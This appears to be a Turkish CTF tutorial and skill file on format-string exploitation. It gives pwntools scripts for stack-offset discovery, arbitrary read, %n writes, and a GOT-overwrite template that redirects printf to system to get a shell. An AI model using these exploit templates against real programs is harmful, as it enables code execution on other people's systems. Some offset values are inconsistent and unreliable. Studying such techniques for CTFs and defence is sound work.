---
name: format-string
description: printf format string ile arbitrary read/write — GOT overwrite, libc leak, RCE
tags: [ctf, pwn, format-string, printf, got-overwrite, arbitrary-write, %p-%s-%n]
triggers:
  - "printf(user_input)"
  - "format string"
  - "arbitrary write"
  - "%p %p %p"
  - "%n yazma"
  - "GOT overwrite"
  - "stack leak printf"
difficulty: medium
category: pwn
solved_challenges:
  - "Google CTF 2023 - write-flag-where (CTF bytes as ROP)"
  - "picoCTF format string serisi"
---

# Format String Exploitation

## Tespit: printf(buf) vs printf("%s", buf) Farkı

```c
// SAVUNMASIZ — kullanıcı girişi doğrudan format string olarak geçiyor
printf(buf);
fprintf(stderr, buf);
sprintf(dst, buf);

// GÜVENLİ — kullanıcı girişi sadece argüman
printf("%s", buf);
```

Kaynak yoksa binary'yi tersine çevir:

```bash
# objdump ile printf çağrılarına bak
objdump -d vuln | grep -A5 "call.*printf"

# gdb'de çalıştır ve %p gönder — stack adresleri geliyorsa zafiyet var
python3 -c "print('%p.'*20)" | ./vuln
```

---

## Stack Leak: %p.%p.%p... ile Offset Bul

Format string argümanları sıralı stack konumlarına karşılık gelir.
`%1$p` → 1. argüman (rsi), `%2$p` → 2. argüman (rdx), ... `%7$p` → stack'ten okuma başlar.

```python
#!/usr/bin/env python3
# fmtstr_offset_finder.py — kaçıncı offset kendi buffer'ımızı gösteriyor?

from pwn import *

BINARY = "./vuln"
context.binary = elf = ELF(BINARY)

MARKER = 0x4141414142424242   # "AAAABBBB" — kolayca tanınır

for i in range(1, 50):
    io = process(BINARY)
    payload = f"AAAABBBB.%{i}$p".encode()
    io.sendlineafter(b">>> ", payload)
    resp = io.recvline()
    io.close()

    if b"0x4141414142424242" in resp or b"4242424241414141" in resp:
        log.success(f"Buffer offset: {i}")
        break
    else:
        log.info(f"[{i}] {resp.strip()}")
```

Çıktı: `Buffer offset: 6` → artık `%6$p` kendi buffer'ını okur.

---

## Arbitrary Read: %N$s ile Adres Oku

Stack'te bir adres varsa o adresin gösterdiği belleği okuyabilirsin:

```python
# Stack'teki N. değeri string olarak oku (null'a kadar)
payload = b"%7$s"

# Belirli bir adresi okumak:
# 1) Adresi buffer'a yaz
# 2) %N$s ile o konumu oku (N = buffer'ın stack offseti)

target_addr = elf.got["puts"]       # örnek: puts GOT girişini oku

# fmtstr ile:
payload = p64(target_addr) + b".%7$s"   # 7 = buffer offset (yukarıda bulduk)

io.sendlineafter(b">>> ", payload)
leaked = io.recvuntil(b"\n").split(b".")[1]
puts_addr = u64(leaked.ljust(8, b"\x00"))
log.success(f"puts@libc = {hex(puts_addr)}")
```

---

## Arbitrary Write: %N$n ile Adrese Yaz

`%n` → o ana kadar yazılan karakter sayısını belirtilen adrese yazar.
`%hn` → 2 byte, `%hhn` → 1 byte yazar.

### Manuel %n Yazma

```python
# target_addr'e value değerini yaz (1 byte)
# Yöntem: %<value>c%<offset>$hhn

target_addr = elf.got["exit"]   # exit GOT'u overwrite et
value       = 0x41             # yazmak istediğimiz değer (1 byte)
buf_offset  = 6               # buffer'ın stack offseti

# Adres buffer'ın başına:
payload  = p64(target_addr)
# %65c → 65 karakter çıkar (0x41 = 65), %6$hhn → 6. stack argümanına yaz
payload += f"%{value - 8}c%{buf_offset}$hhn".encode()
# Not: p64 zaten 8 byte yazdığı için value'dan 8 çıkar

io.sendlineafter(b">>> ", payload)
```

### 4-byte Değer Yazmak (short write tekniği)

Büyük değerleri (adres gibi) tek seferde yazmak yavaş olur (milyonlarca karakter).
Bunun yerine 2-byte parçalar halinde yaz:

```python
target_addr = elf.got["puts"]
new_value   = 0xdeadbeef       # 4 byte değer

low2  = new_value & 0xffff        # 0xbeef
high2 = (new_value >> 16) & 0xffff  # 0xdead

# İki ayrı write
writes = {
    target_addr    : low2,
    target_addr + 2: high2,
}
```

---

## pwntools fmtstr_payload Kullanımı

pwntools'un `fmtstr_payload` fonksiyonu tüm bu işi otomatik yapar:

```python
#!/usr/bin/env python3
# fmtstr_exploit.py — pwntools otomatik payload

from pwn import *

BINARY = "./vuln"
context.binary = elf = ELF(BINARY)
context.log_level = "info"

io = process(BINARY)

# Hedef: exit() çağrıldığında win() çalışsın
exit_got = elf.got["exit"]
win_addr  = elf.symbols["win"]

OFFSET = 6   # buffer'ın stack offseti (yukarıda bulduk)

# fmtstr_payload(offset, {adres: değer}, yazma birimi)
# numbwritten: payload öncesinde kaç byte yazıldı (genellikle 0)
payload = fmtstr_payload(OFFSET, {exit_got: win_addr}, numbwritten=0)

log.info(f"Payload uzunluğu: {len(payload)}")
io.sendlineafter(b">>> ", payload)

io.interactive()
```

### fmtstr_payload Parametreleri

```python
fmtstr_payload(
    offset,           # buffer'ın stack offset numarası
    writes,           # {adres: değer} sözlüğü
    numbwritten=0,    # önceden yazdırılan karakter sayısı
    write_size="byte" # "byte" | "short" | "int" — yazma granülaritesi
)
```

---

## GOT Overwrite Şablonu

```python
#!/usr/bin/env python3
# got_overwrite.py — format string ile GOT zehirleme

from pwn import *

BINARY = "./vuln"
LIBC   = "./libc.so.6"

context.binary = elf  = ELF(BINARY)
libc = ELF(LIBC)
context.log_level = "info"

def start():
    if args.REMOTE:
        return remote("chall.ctf.site", 1337)
    return process(BINARY)

io = start()

OFFSET = 6   # kendi binary'ne göre ayarla

# ── Aşama 1: Libc Leak (printf göndererek okuma) ─────────────────────────────
# printf@got adresini stack'e hazırla ve %7$s ile oku
printf_got = elf.got["printf"]

# Adres buffer'da duruyor, %7$s o belleği okuyor
leak_payload = p64(printf_got) + f"%{OFFSET}$s".encode()

io.sendlineafter(b">>> ", leak_payload)
resp = io.recvuntil(b"\n")

# İlk 8 byte adres, sonrasında "."
leaked = resp[8:16].ljust(8, b"\x00")
printf_libc = u64(leaked)
log.success(f"printf@libc = {hex(printf_libc)}")

libc.address = printf_libc - libc.symbols["printf"]
log.success(f"libc base   = {hex(libc.address)}")

system_addr = libc.symbols["system"]
log.info(f"system      = {hex(system_addr)}")

# ── Aşama 2: GOT Overwrite — printf → system ─────────────────────────────────
# Artık printf("/bin/sh") → system("/bin/sh") gibi çalışır!
writes = {elf.got["printf"]: system_addr}
overwrite_payload = fmtstr_payload(OFFSET, writes)

io.sendlineafter(b">>> ", overwrite_payload)

# ── Aşama 3: Trigger ──────────────────────────────────────────────────────────
# printf("/bin/sh") çağrılacak — artık system("/bin/sh")
io.sendlineafter(b">>> ", b"/bin/sh\x00")

io.interactive()
```

---

## Yaygın Tuzaklar

### 1. Null Byte Sorunu (64-bit)
64-bit adreslerde `\x00` byte'ları format string'i keser.
Çözüm: adresi payload'ın sonuna koy.

```python
# Hatalı — adres başta, null byte formatı keser
payload = p64(addr) + b"%6$s"

# Doğru yöntem — pwntools bunu otomatik halleder
# Manuel yaparsan adresi en sona taşı ve formatı önce ver:
payload = b"%6$s" + p64(addr)
# Ama offset hesaplaması değişir — dikkatli ol
```

### 2. Partial RELRO vs Full RELRO
```bash
checksec vuln
# Partial RELRO → GOT yazılabilir, overwrite mümkün
# Full RELRO    → GOT salt okunur, sadece okuma saldırısı yapılabilir
```

### 3. Buffer Boyutu Kısıtlaması
`fmtstr_payload` bazen uzun payload üretir.
Kısa tutmak için:
```python
payload = fmtstr_payload(OFFSET, writes, write_size="short")  # daha kısa
```

### 4. printf Çıktı Tamponu
`printf` çıktısı bazen tamponlanır — `fflush` çağrısına kadar gelmeyebilir.
```python
io.recvuntil(b">>> ", timeout=3)   # timeout ile bekle
```
